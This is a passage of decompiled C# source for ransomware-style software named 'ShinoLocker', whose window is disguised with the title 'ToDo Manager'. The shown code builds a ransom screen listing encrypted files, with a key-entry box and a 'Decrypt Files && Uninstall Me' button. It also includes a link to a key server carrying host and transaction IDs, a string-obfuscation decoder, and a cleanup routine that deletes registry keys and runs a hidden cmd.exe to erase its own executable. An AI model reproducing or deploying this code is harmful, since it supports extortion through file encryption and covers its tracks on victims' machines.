						case 5:
							goto IL_002e;
						case 6:
							goto IL_0043;
						case 7:
							goto IL_0050;
						case 8:
							goto IL_006c;
						case 9:
							goto IL_0074;
						case 10:
							goto IL_007f;
						case 11:
							goto IL_0090;
						case 12:
							goto IL_0097;
						case 13:
							goto IL_00b3;
						case 14:
							goto IL_00cf;
						case 15:
							goto IL_00d9;
						case 16:
							goto IL_00f2;
						case 17:
							goto IL_00fd;
						case 18:
							goto IL_0108;
						case 19:
							goto IL_0117;
						case 20:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 21:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0117:
					num = 19;
					Process.Start(processStartInfo);
					break;
					IL_0007:
					num = 2;
					File.Delete(TF);
					goto IL_0014;
					IL_0014:
					num = 3;
					File.Delete(FL);
					goto IL_0021;
					IL_0021:
					num = 4;
					File.Delete(PS);
					goto IL_002e;
					IL_002e:
					num = 5;
					if (Operators.CompareString(Application.get_ExecutablePath(), P, false) != 0)
					{
						goto IL_0043;
					}
					goto IL_0050;
					IL_0043:
					num = 6;
					File.Delete(P);
					goto IL_0050;
					IL_0050:
					num = 7;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKeyTree(RK);
					goto IL_006c;
					IL_006c:
					num = 8;
					current = WindowsIdentity.GetCurrent();
					goto IL_0074;
					IL_0074:
					num = 9;
					windowsPrincipal = new WindowsPrincipal(current);
					goto IL_007f;
					IL_007f:
					num = 10;
					flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
					goto IL_0090;
					IL_0090:
					num = 11;
					if (flag)
					{
						goto IL_0097;
					}
					goto IL_00cf;
					IL_0097:
					num = 12;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKeyTree(".shino");
					goto IL_00b3;
					IL_00b3:
					num = 13;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKeyTree("ShinoLockerEncryptedFile");
					goto IL_00cf;
					IL_00cf:
					num = 14;
					processStartInfo = new ProcessStartInfo();
					goto IL_00d9;
					IL_00d9:
					num = 15;
					processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath();
					goto IL_00f2;
					IL_00f2:
					num = 16;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_00fd;
					IL_00fd:
					num = 17;
					processStartInfo.CreateNoWindow = true;
					goto IL_0108;
					IL_0108:
					num = 18;
					processStartInfo.FileName = "cmd.exe";
					goto IL_0117;
					end_IL_0000_2:
					break;
				}
				num = 20;
				Application.Exit();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 403;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void lnkGetKey_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start(UU + "?h=" + H + "&t=" + Uri.EscapeDataString(V) + "#key");
	}

	private string DC(string t)
	{
		checked
		{
			try
			{
				t = Strings.Replace(t, "\t", " ", 1, -1, (CompareMethod)0);
				t = Strings.Replace(t, "\r", " ", 1, -1, (CompareMethod)0);
				t = Strings.Replace(t, "\n", " ", 1, -1, (CompareMethod)0);
				t = Strings.Replace(t, "\0", " ", 1, -1, (CompareMethod)0);
				int num = 33;
				do
				{
					t = Strings.Replace(t, Conversions.ToString(Strings.Chr(num)), " ", 1, -1, (CompareMethod)0);
					num++;
				}
				while (num <= 47);
				int num2 = 58;
				do
				{
					t = Strings.Replace(t, Conversions.ToString(Strings.Chr(num2)), " ", 1, -1, (CompareMethod)0);
					num2++;
				}
				while (num2 <= 64);
				int num3 = 91;
				do
				{
					t = Strings.Replace(t, Conversions.ToString(Strings.Chr(num3)), " ", 1, -1, (CompareMethod)0);
					num3++;
				}
				while (num3 <= 96);
				int num4 = 123;
				do
				{
					t = Strings.Replace(t, Conversions.ToString(Strings.Chr(num4)), " ", 1, -1, (CompareMethod)0);
					num4++;
				}
				while (num4 <= 255);
				while (Strings.InStr(t, "  ", (CompareMethod)0) != 0)
				{
					t = Strings.Replace(t, "  ", " ", 1, -1, (CompareMethod)0);
				}
				string[] array = Strings.Split(Strings.Trim(t), " ", -1, (CompareMethod)0);
				if (unchecked(array.Length % 2) != 0)
				{
					return "Encode Error";
				}
				string text = "";
				int num5 = array.Length - 2;
				for (int i = 0; i <= num5; i += 2)
				{
					if (!((Strings.Len(array[i]) - 2 > 16) | (Strings.Len(array[i + 1]) - 2 > 16)))
					{
						text += Conversions.ToString(Strings.Chr((int)Convert.ToInt64(Conversion.Hex(Strings.Len(array[i]) - 2) + Conversion.Hex(Strings.Len(array[i + 1]) - 2), 16)));
					}
				}
				return text;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.InputBox("Error:", "ERROR", ex2.Message + " " + t, -1, -1);
				string result = "Encode Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_03ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f8: Expected O, but got Unknown
		//IL_048f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0499: Expected O, but got Unknown
		//IL_0530: Unknown result type (might be due to invalid IL or missing references)
		//IL_053a: Expected O, but got Unknown
		//IL_05ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d8: Expected O, but got Unknown
		//IL_066f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0679: Expected O, but got Unknown
		//IL_071d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0727: Expected O, but got Unknown
		//IL_08b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bb: Expected O, but got Unknown
		//IL_0987: Unknown result type (might be due to invalid IL or missing references)
		//IL_0991: Expected O, but got Unknown
		//IL_0a6d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a77: Expected O, but got Unknown
		//IL_0b41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4b: Expected O, but got Unknown
		//IL_0be8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf2: Expected O, but got Unknown
		//IL_0cb3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cbd: Expected O, but got Unknown
		//IL_0e19: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e23: Expected O, but got Unknown
		//IL_0ebf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ec9: Expected O, but got Unknown
		//IL_0fde: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe8: Expected O, but got Unknown
		//IL_1075: Unknown result type (might be due to invalid IL or missing references)
		//IL_107f: Expected O, but got Unknown
		//IL_115d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1167: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		Timer1 = new Timer(components);
		Header = new Panel();
		lblServer = new Label();
		Panel1 = new Panel();
		lblInputKey = new Label();
		lblStep3 = new Label();
		lblStep2 = new Label();
		lblGetTheKey = new Label();
		lblStep1 = new Label();
		lnkGetKey = new LinkLabel();
		BottomUp = new Panel();
		lblTransaction = new TextBox();
		txtTID = new MaskedTextBox();
		txtHID = new TextBox();
		lblHost = new TextBox();
		btnValidateKey = new Button();
		txtKey = new MaskedTextBox();
		Panel2 = new Panel();
		chkFile = new CheckedListBox();
		chkMain = new CheckedListBox();
		Panel3 = new Panel();
		lblEncryptedFile = new Label();
		Label1 = new Label();
		((Control)Header).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)BottomUp).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1000);
		((Control)Header).set_BackColor(Color.Black);
		((Control)Header).get_Controls().Add((Control)(object)lblServer);
		((Control)Header).set_Dock((DockStyle)1);
		((Control)Header).set_Location(new Point(0, 0));
		((Control)Header).set_Name("Header");
		((Control)Header).set_Size(new Size(873, 44));
		((Control)Header).set_TabIndex(0);
		lblServer.set_AutoSize(true);
		((Control)lblServer).set_BackColor(Color.Black);
		((Control)lblServer).set_Dock((DockStyle)3);
		((Control)lblServer).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)lblServer).set_ForeColor(Color.Lime);
		((Control)lblServer).set_Location(new Point(0, 0));
		((Control)lblServer).set_Name("lblServer");
		((Control)lblServer).set_Size(new Size(96, 28));
		((Control)lblServer).set_TabIndex(2);
		lblServer.set_Text("SERVER");
		((Control)Panel1).set_BackColor(Color.White);
		((Control)Panel1).get_Controls().Add((Control)(object)lblInputKey);
		((Control)Panel1).get_Controls().Add((Control)(object)lblStep3);
		((Control)Panel1).get_Controls().Add((Control)(object)lblStep2);
		((Control)Panel1).get_Controls().Add((Control)(object)lblGetTheKey);
		((Control)Panel1).get_Controls().Add((Control)(object)lblStep1);
		((Control)Panel1).get_Controls().Add((Control)(object)lnkGetKey);
		((Control)Panel1).get_Controls().Add((Control)(object)BottomUp);
		((Control)Panel1).get_Controls().Add((Control)(object)btnValidateKey);
		((Control)Panel1).get_Controls().Add((Control)(object)txtKey);
		((Control)Panel1).set_Dock((DockStyle)2);
		((Control)Panel1).set_ForeColor(Color.Black);
		((Control)Panel1).set_Location(new Point(0, 383));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(873, 222));
		((Control)Panel1).set_TabIndex(1);
		lblInputKey.set_AutoSize(true);
		((Control)lblInputKey).set_Font(new Font("ＭＳ ゴシック", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)lblInputKey).set_ForeColor(Color.Black);
		((Control)lblInputKey).set_Location(new Point(116, 127));
		((Control)lblInputKey).set_Name("lblInputKey");
		((Control)lblInputKey).set_Size(new Size(152, 20));
		((Control)lblInputKey).set_TabIndex(13);
		lblInputKey.set_Text("Input the key");
		((Control)lblInputKey).set_Visible(false);
		lblStep3.set_AutoSize(true);
		((Control)lblStep3).set_Font(new Font("ＭＳ ゴシック", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)lblStep3).set_ForeColor(Color.Black);
		((Control)lblStep3).set_Location(new Point(30, 178));
		((Control)lblStep3).set_Name("lblStep3");
		((Control)lblStep3).set_Size(new Size(75, 20));
		((Control)lblStep3).set_TabIndex(12);
		lblStep3.set_Text("STEP3:");
		((Control)lblStep3).set_Visible(false);
		lblStep2.set_AutoSize(true);
		((Control)lblStep2).set_Font(new Font("ＭＳ ゴシック", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)lblStep2).set_ForeColor(Color.Black);
		((Control)lblStep2).set_Location(new Point(30, 126));
		((Control)lblStep2).set_Name("lblStep2");
		((Control)lblStep2).set_Size(new Size(75, 20));
		((Control)lblStep2).set_TabIndex(11);
		lblStep2.set_Text("STEP2:");
		((Control)lblStep2).set_Visible(false);
		lblGetTheKey.set_AutoSize(true);
		((Control)lblGetTheKey).set_Font(new Font("ＭＳ ゴシック", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)lblGetTheKey).set_ForeColor(Color.Black);
		((Control)lblGetTheKey).set_Location(new Point(116, 75));
		((Control)lblGetTheKey).set_Name("lblGetTheKey");
		((Control)lblGetTheKey).set_Size(new Size(185, 20));
		((Control)lblGetTheKey).set_TabIndex(10);
		lblGetTheKey.set_Text("Get the key from");
		((Control)lblGetTheKey).set_Visible(false);
		lblStep1.set_AutoSize(true);
		((Control)lblStep1).set_Font(new Font("ＭＳ ゴシック", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)lblStep1).set_ForeColor(Color.Black);
		((Control)lblStep1).set_Location(new Point(30, 75));
		((Control)lblStep1).set_Name("lblStep1");
		((Control)lblStep1).set_Size(new Size(75, 20));
		((Control)lblStep1).set_TabIndex(9);
		lblStep1.set_Text("STEP1:");
		((Control)lblStep1).set_Visible(false);
		lnkGetKey.set_ActiveLinkColor(Color.Lime);
		((Label)lnkGetKey).set_AutoSize(true);
		((Control)lnkGetKey).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)lnkGetKey).set_ForeColor(Color.Black);
		lnkGetKey.set_LinkColor(Color.Lime);
		((Control)lnkGetKey).set_Location(new Point(307, 67));
		((Control)lnkGetKey).set_Name("lnkGetKey");
		((Control)lnkGetKey).set_Size(new Size(264, 28));
		((Control)lnkGetKey).set_TabIndex(8);
		((Label)lnkGetKey).set_TabStop(true);
		lnkGetKey.set_Text("ShinoLocker Server");
		((Control)lnkGetKey).set_Visible(false);
		((Control)BottomUp).get_Controls().Add((Control)(object)lblTransaction);
		((Control)BottomUp).get_Controls().Add((Control)(object)txtTID);
		((Control)BottomUp).get_Controls().Add((Control)(object)txtHID);
		((Control)BottomUp).get_Controls().Add((Control)(object)lblHost);
		((Control)BottomUp).set_Dock((DockStyle)1);
		((Control)BottomUp).set_Location(new Point(0, 0));
		((Control)BottomUp).set_Name("BottomUp");
		((Control)BottomUp).set_Size(new Size(873, 47));
		((Control)BottomUp).set_TabIndex(5);
		((TextBoxBase)lblTransaction).set_BackColor(Color.White);
		((TextBoxBase)lblTransaction).set_BorderStyle((BorderStyle)0);
		((Control)lblTransaction).set_Cursor(Cursors.get_Arrow());
		((Control)lblTransaction).set_Dock((DockStyle)4);
		((Control)lblTransaction).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((TextBoxBase)lblTransaction).set_ForeColor(Color.Lime);
		((Control)lblTransaction).set_Location(new Point(196, 0));
		((Control)lblTransaction).set_Name("lblTransaction");
		((TextBoxBase)lblTransaction).set_ReadOnly(true);
		((Control)lblTransaction).set_Size(new Size(220, 27));
		((Control)lblTransaction).set_TabIndex(6);
		((Control)lblTransaction).set_TabStop(false);
		lblTransaction.set_Text("TRANSACTION ID:");
		((Control)lblTransaction).set_Visible(false);
		((TextBoxBase)txtTID).set_BackColor(Color.White);
		txtTID.set_CutCopyMaskFormat((MaskFormat)0);
		((Control)txtTID).set_Dock((DockStyle)4);
		((Control)txtTID).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((TextBoxBase)txtTID).set_ForeColor(Color.Black);
		((Control)txtTID).set_Location(new Point(416, 0));
		txtTID.set_Mask("CCCC-CCCC-CCCC-CCCC-CCCC-CCCC");
		((Control)txtTID).set_Name("txtTID");
		txtTID.set_ReadOnly(true);
		((Control)txtTID).set_Size(new Size(457, 34));
		((Control)txtTID).set_TabIndex(5);
		txtTID.set_Text("AAAABBBBCCCCDDDDEEEEFFFF");
		txtTID.set_TextMaskFormat((MaskFormat)0);
		((Control)txtTID).set_Visible(false);
		((TextBoxBase)txtHID).set_BackColor(Color.White);
		((TextBoxBase)txtHID).set_BorderStyle((BorderStyle)0);
		((Control)txtHID).set_Dock((DockStyle)3);
		((Control)txtHID).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((TextBoxBase)txtHID).set_ForeColor(Color.Black);
		((Control)txtHID).set_Location(new Point(120, 0));
		((Control)txtHID).set_Name("txtHID");
		((TextBoxBase)txtHID).set_ReadOnly(true);
		((Control)txtHID).set_Size(new Size(120, 27));
		((Control)txtHID).set_TabIndex(2);
		txtHID.set_Text("99999");
		((Control)txtHID).set_Visible(false);
		((TextBoxBase)lblHost).set_BackColor(Color.White);
		((TextBoxBase)lblHost).set_BorderStyle((BorderStyle)0);
		((Control)lblHost).set_Cursor(Cursors.get_Arrow());
		((Control)lblHost).set_Dock((DockStyle)3);
		((Control)lblHost).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((TextBoxBase)lblHost).set_ForeColor(Color.Lime);
		((Control)lblHost).set_Location(new Point(0, 0));
		((Control)lblHost).set_Name("lblHost");
		((TextBoxBase)lblHost).set_ReadOnly(true);
		((Control)lblHost).set_Size(new Size(120, 27));
		((Control)lblHost).set_TabIndex(1);
		((Control)lblHost).set_TabStop(false);
		lblHost.set_Text("HOST ID:");
		((Control)lblHost).set_Visible(false);
		((Control)btnValidateKey).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)btnValidateKey).set_ForeColor(Color.Black);
		((Control)btnValidateKey).set_Location(new Point(120, 169));
		((Control)btnValidateKey).set_Name("btnValidateKey");
		((Control)btnValidateKey).set_Size(new Size(477, 41));
		((Control)btnValidateKey).set_TabIndex(4);
		((ButtonBase)btnValidateKey).set_Text("Decrypt Files && Uninstall Me");
		((ButtonBase)btnValidateKey).set_UseVisualStyleBackColor(true);
		((Control)btnValidateKey).set_Visible(false);
		((TextBoxBase)txtKey).set_BackColor(Color.White);
		((TextBoxBase)txtKey).set_BorderStyle((BorderStyle)0);
		txtKey.set_CutCopyMaskFormat((MaskFormat)0);
		((Control)txtKey).set_Font(new Font("ＭＳ ゴシック", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((TextBoxBase)txtKey).set_ForeColor(Color.Lime);
		((Control)txtKey).set_Location(new Point(274, 121));
		txtKey.set_Mask("CCCC-CCCC-CCCC-CCCC-CCCC-CCCC");
		((Control)txtKey).set_Name("txtKey");
		((Control)txtKey).set_Size(new Size(552, 27));
		((Control)txtKey).set_TabIndex(3);
		txtKey.set_TextMaskFormat((MaskFormat)0);
		((Control)txtKey).set_Visible(false);
		((Control)Panel2).set_BackColor(Color.White);
		((Control)Panel2).get_Controls().Add((Control)(object)chkFile);
		((Control)Panel2).get_Controls().Add((Control)(object)chkMain);
		((Control)Panel2).get_Controls().Add((Control)(object)Panel3);
		((Control)Panel2).set_Dock((DockStyle)5);
		((Control)Panel2).set_Location(new Point(0, 44));
		((Control)Panel2).set_Name("Panel2");
		((Control)Panel2).set_Size(new Size(873, 339));
		((Control)Panel2).set_TabIndex(2);
		((ListBox)chkFile).set_BackColor(Color.Black);
		((Control)chkFile).set_Dock((DockStyle)5);
		((ListBox)chkFile).set_Font(new Font("ＭＳ ゴシック", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((ListBox)chkFile).set_ForeColor(Color.Lime);
		((ListControl)chkFile).set_FormattingEnabled(true);
		((Control)chkFile).set_Location(new Point(350, 42));
		((Control)chkFile).set_Name("chkFile");
		((Control)chkFile).set_Size(new Size(523, 297));
		((Control)chkFile).set_TabIndex(4);
		((ListBox)chkMain).set_BackColor(Color.Black);
		((Control)chkMain).set_Dock((DockStyle)3);
		((ListBox)chkMain).set_Font(new Font("ＭＳ ゴシック", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((ListBox)chkMain).set_ForeColor(Color.Lime);
		((ListControl)chkMain).set_FormattingEnabled(true);
		((Control)chkMain).set_Location(new Point(0, 42));
		((Control)chkMain).set_Name("chkMain");
		((Control)chkMain).set_Size(new Size(350, 297));
		((Control)chkMain).set_TabIndex(3);
		((Control)Panel3).set_BackColor(Color.Black);
		((Control)Panel3).get_Controls().Add((Control)(object)lblEncryptedFile);
		((Control)Panel3).get_Controls().Add((Control)(object)Label1);
		((Control)Panel3).set_Dock((DockStyle)1);
		((Control)Panel3).set_Location(new Point(0, 0));
		((Control)Panel3).set_Name("Panel3");
		((Control)Panel3).set_Size(new Size(873, 42));
		((Control)Panel3).set_TabIndex(2);
		lblEncryptedFile.set_AutoSize(true);
		((Control)lblEncryptedFile).set_Font(new Font("MS UI Gothic", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)lblEncryptedFile).set_ForeColor(Color.Lime);
		((Control)lblEncryptedFile).set_Location(new Point(347, 17));
		((Control)lblEncryptedFile).set_Name("lblEncryptedFile");
		((Control)lblEncryptedFile).set_Size(new Size(160, 20));
		((Control)lblEncryptedFile).set_TabIndex(1);
		lblEncryptedFile.set_Text("Encrypted Files ");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("MS UI Gothic", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)Label1).set_ForeColor(Color.Lime);
		((Control)Label1).set_Location(new Point(1, 17));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(90, 20));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Progress");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 15f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(873, 605));
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)Header);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MinimumSize(new Size(874, 517));
		((Control)this).set_Name("frmMain");
		((Form)this).set_Text("ToDo Manager");
		((Form)this).set_TopMost(true);
		((Control)Header).ResumeLayout(false);
		((Control)Header).PerformLayout();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)BottomUp).ResumeLayout(false);
		((Control)BottomUp).PerformLayout();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
